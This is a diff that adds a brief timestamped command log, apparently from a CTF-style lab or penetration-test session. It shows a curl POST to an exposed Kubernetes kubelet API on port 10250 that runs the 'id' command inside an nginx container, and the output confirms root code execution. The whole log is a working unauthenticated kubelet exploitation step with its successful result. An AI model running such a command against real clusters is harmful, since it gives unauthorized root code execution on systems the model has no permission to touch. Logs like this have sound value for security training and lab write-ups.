@@ -1,0 +1,11 @@
+### [2026-04-05 10:36:51] curl -k -X POST https://10.129.96.167:10250/run/default/nginx/nginx -d cmd=id
+
+$ curl -k -X POST https://10.129.96.167:10250/run/default/nginx/nginx -d cmd=id
+
+  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
+                                 Dload  Upload  Total   Spent   Left   Speed
+  0      0   0      0   0      0      0      0                              0100     45 100     39 100      6    276     42                              0100     45 100     39 100      6    276     42                              0100     45 100     39 100      6    276     42                              0
+uid=0(root) gid=0(root) groups=0(root)
+
+# Exit code: 0
+# Duration: 2026-04-05 10:36:51
